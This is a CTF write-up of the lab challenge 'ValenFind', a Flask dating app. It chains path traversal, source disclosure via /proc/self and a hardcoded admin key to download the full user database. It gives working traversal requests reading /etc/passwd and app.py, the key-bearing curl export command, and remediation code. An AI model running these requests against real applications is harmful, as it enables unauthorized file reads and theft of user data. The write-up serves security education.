ValenFind: How a Dating App Gave Away Its Entire Database

Chaining path traversal, source code disclosure, and a hardcoded API key to achieve full database exfiltration

⚠ Disclaimer This writeup documents a Capture The Flag (CTF) challenge conducted in a controlled lab environment. All techniques described were performed only against the target machine provided for this challenge. Never attempt these techniques against systems you do not have explicit permission to test.
01 — Introduction

A Dating App With Secrets

ValenFind is a Valentine's Day-themed CTF challenge built on a Flask web application. The premise is a simple dating platform — browse profiles, send likes, find your match. Beneath the pink UI, however, the app is riddled with vulnerabilities that chain together into a complete compromise: from reading /etc/passwd all the way to downloading the entire user database and capturing the flag.

This writeup documents my methodology step by step, from initial reconnaissance to the final flag.

◆
02 — Reconnaissance

Mapping the Application

My first step was a manual walkthrough of the entire application — no tools, just browser and eyes. I mapped every visible surface:

Pages discovered: / · /register · /login · /dashboard · /my_profile · /profile/<username> · /like/<id> · /logout

The dashboard immediately stood out — it listed every registered user including an admin account, with sequential integer IDs exposed in the Like form actions (/like/1, /like/2…). This is a classic IDOR setup and a sign of weak access control design throughout.

I also noticed missing CSRF tokens on all POST forms, and plaintext-looking like counts — but these were secondary. What caught my eye most was the profile for cupid, whose bio read:

💬 cupid's bio "I keep the database secure. No peeking."

The irony of that bio would become apparent very quickly.

◆
03 — Finding #1

Path Traversal via fetch_layout

Viewing cupid's profile page, I opened DevTools and inspected the JavaScript. A function called loadTheme() stood out immediately:

profile.html — JavaScriptfunction loadTheme(layoutName) {
  // Feature: Dynamic Layout Fetching
  fetch(`/api/fetch_layout?layout=${layoutName}`)
    .then(r => r.text())
    .then(html => {
      // Client-side rendering of the fetched template
      let rendered = html.replace('__USERNAME__', username)
                         .replace('__BIO__', bioText);
      document.getElementById('bio-container').innerHTML = rendered;
    });
}

The layout parameter is passed directly to a server-side file fetch with no validation beyond a blocklist. The value comes from a <select> dropdown — client-side only, trivially bypassed. My first test was the classic path traversal payload:

browser / curl
GET http://10.48.133.124:5000/api/fetch_layout?layout=../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...

It worked. The server returned /etc/passwd in full — confirming unauthenticated path traversal with no path canonicalization and a broken blocklist that only checked for the string cupid.db or the .db extension.

◆
04 — Finding #2

Source Code Disclosure via /proc/self

With traversal confirmed, the next goal was locating the application source code. Rather than guessing paths, I used /proc/self/cmdline — a Linux pseudo-file that reveals the exact command used to launch the current process (the Flask app itself):

proc enumeration
GET /api/fetch_layout?layout=../../../../../proc/self/cmdline

/usr/bin/python3/opt/Valenfind/app.py

This revealed two critical pieces of information: the Python interpreter path and — most importantly — the exact application root: /opt/Valenfind/. No guessing required. I now read the source directly:

source disclosure
GET /api/fetch_layout?layout=../../../../../opt/Valenfind/app.py

import os, sqlite3, hashlib from flask import Flask, render_template, ... ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO" DATABASE = 'cupid.db' ...

The source code was fully readable. Within seconds of scanning it, two findings jumped out:

FIND-01

Critical Hardcoded Admin API Key

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

A hardcoded secret in source code is essentially a public secret. Anyone who can read this file — via path traversal, version control leaks, or misconfigured logging — now has admin access.

FIND-02

Critical Unauthenticated Database Export Endpoint

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)

The entire SQLite database can be downloaded by anyone who knows the API key — no login session, no IP restriction, no rate limit. The "authentication" is a single header check against a hardcoded string we already know.

05 — Exploitation

Full Database Exfiltration

With the hardcoded key in hand, exploiting the export endpoint was a single curl command:

bashcurl http://10.48.133.124:5000/api/admin/export_db \
  -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
  --output valenfind.db

The server responded with a full SQLite database download. I opened it locally:

08 — Remediation

How to Fix These Issues

1. Fix the Path Traversal — Use an Allowlist

The existing blocklist approach ("block if it contains cupid.db") is fundamentally broken. Replace it with a strict allowlist:

app.py — fixed fetch_layoutALLOWED_LAYOUTS = {'theme_classic.html', 'theme_modern.html', 'theme_romance.html'}

def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    if layout_file not in ALLOWED_LAYOUTS:
        return "Invalid layout", 400
    # safe to proceed

2. Never Hardcode Secrets — Use Environment Variables

app.py — fixed secret handling# Bad
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

# Good
ADMIN_API_KEY = os.getenv('ADMIN_API_KEY')
if not ADMIN_API_KEY:
    raise RuntimeError("ADMIN_API_KEY not set")

3. Hash Passwords with bcrypt or Argon2

app.py — password hashingfrom werkzeug.security import generate_password_hash, check_password_hash

# On register
hashed = generate_password_hash(password)

# On login
if user and check_password_hash(user['password'], password):
    ...

4. Replace innerHTML with DOMPurify

profile.html — XSS fix// Bad
document.getElementById('bio-container').innerHTML = rendered;

// Good — sanitize before injecting
document.getElementById('bio-container').innerHTML = DOMPurify.sanitize(rendered);

5. Add CSRF Tokens to All State-Changing Forms

Flask-WTF handles this automatically. Enable it globally and add {{ form.hidden_tag() }} to every form template, or use the CSRFProtect extension for non-WTF forms.

09 — Takeaways

Key Lessons

🔗 Vulnerability chaining matters No single bug here was catastrophic in isolation. Path traversal alone gives file read. Hardcoded keys alone are useless without knowing the endpoint. The chain is what causes total compromise — always think about how findings connect.
📋 Blocklists always lose The developer tried to block cupid.db and .db extensions. But there are infinite ways to reference a file — double encoding, case variation, symlinks, alternate extensions. Allowlists are the only reliable pattern.
🔍 /proc/self is your friend When you have path traversal on a Linux system, /proc/self/cmdline and /proc/self/environ are often the fastest path to app secrets and configuration — no guessing required.

ValenFind was a well-constructed CTF that reflects real-world vulnerability patterns found in actual web applications. The cupid bio — "I keep the database secure. No peeking." — was the perfect troll from the challenge author. The database was never secure, and we definitely peeked.
